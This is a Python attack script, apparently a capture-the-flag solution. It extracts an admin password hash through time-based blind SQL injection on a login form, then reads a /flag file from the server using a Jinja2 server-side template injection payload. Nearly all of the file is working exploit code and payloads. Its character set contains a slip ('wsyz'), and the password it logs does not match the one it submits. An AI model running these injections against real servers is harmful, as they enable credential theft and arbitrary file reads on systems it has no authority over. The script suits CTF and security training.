#-*- coding:utf-8 -*-
import sys
import requests
from requests import exceptions
import logging
from time import sleep
logging.basicConfig(format="%(asctime)s-[%(levelname)s]:%(message)s",level=logging.INFO)


def sqlpw(url):
    session=requests.Session()
    params={"password":"0"}
    password=""
    for i in range(32):
        for x in "0123456789abcdefghijklmnopqrstuvwsyz":
            try:
                username="admin'AND(SELECT(hex(substr(password,{},1)))FROM(users))=hex('{}')AND(randomblob(1000000000))--".format(i+1,x)
                params['username']=username
                # print(params)
                r=session.post(url,data=params,timeout=1)
                # print(r.status_code)
            except exceptions.Timeout:
                password=password+x
                logging.info("md5 Password[len:{}]:{}".format(i+1,password))
                sleep(3)
                break
    return password


def run(host,port):
    url="http://"+host+":"+port
    try:
        r=requests.get(url,timeout=3)
        if r.status_code==200:
            logging.info("Connect to host success")
        else:
            raise Exception
    except:
        logging.error("Cannot connect to host: "+host)
        return False
    
    password=sqlpw(url+"/login")
    logging.info("the md5(32) of Password: "+password)
    logging.info("the password is !@#$%^&*()")

    session=requests.Session()
    r=session.post(url+"/login",data={"username":"admin","password":"!@#$%^&*()_+"})
    r=session.get(url+"/index",params={"username":r"""{{''.__class__.__base__.__subclasses__().pop(78).__init__.__globals__.__builtins__.open("/flag",encoding="utf-8").read()}}"""})
    text=r.text
    logging.info("Raw text:"+text)
    print(text[text.find("Welcome ")+7:-5])



if __name__ == "__main__":
    host=sys.argv[1]
    port=sys.argv[2]
    run(host,port)
